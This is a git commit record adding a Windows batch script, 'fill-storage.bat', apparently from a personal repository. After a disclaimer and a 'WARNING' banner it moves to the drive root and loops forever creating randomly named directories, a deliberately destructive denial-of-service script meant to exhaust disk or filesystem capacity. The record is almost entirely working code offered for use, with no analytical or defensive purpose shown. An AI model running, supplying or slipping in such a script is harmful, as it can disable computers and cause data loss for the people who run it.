5e77bc5e7ad0b3fdb653afaf90388e1007d975b2
qwk <80052118+qwkdev@users.noreply.github.com>
2024-06-02 22:05:47 +0100

    Add files via upload

---
+++ batch/fill-storage.bat
@@ -0,0 +1,32 @@
+@echo off
+title STORAGE FILLER
+
+chcp 65001
+cls
+echo [1;91;40mDISCLAIMER:[0m By using this program, you acknowledge and accept full responsibility for any potential loss of data or damage to your system, and release the author from any liability arising from its use.
+echo [1;91;40m██╗    ██╗ █████╗ ██████╗ ███╗   ██╗██╗███╗   ██╗ ██████╗ [0m
+echo [1;91;40m██║    ██║██╔══██╗██╔══██╗████╗  ██║██║████╗  ██║██╔════╝ [0m
+echo [1;91;40m██║ █╗ ██║███████║██████╔╝██╔██╗ ██║██║██╔██╗ ██║██║  ███╗[0m
+echo [1;91;40m██║███╗██║██╔══██║██╔══██╗██║╚██╗██║██║██║╚██╗██║██║   ██║[0m
+echo [1;91;40m╚███╔███╔╝██║  ██║██║  ██║██║ ╚████║██║██║ ╚████║╚██████╔╝[0m
+echo [1;91;40m ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝╚═╝  ╚═══╝ ╚═════╝ [0m
+echo This may cause [1;91;40mSERIOUS DAMAGE[0m or [1;91;40mBRICK[0m your computer
+echo [1;91;40mDO NOT RUN THIS ON A HOME COMPUTER[0m
+pause
+cls
+
+cd ..
+cd ..
+cd ..
+cd ..
+cd ..
+cd ..
+cd ..
+cd ..
+cd ..
+cd ..
+start .
+:fill
+mkdir %RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%
+goto fill
+
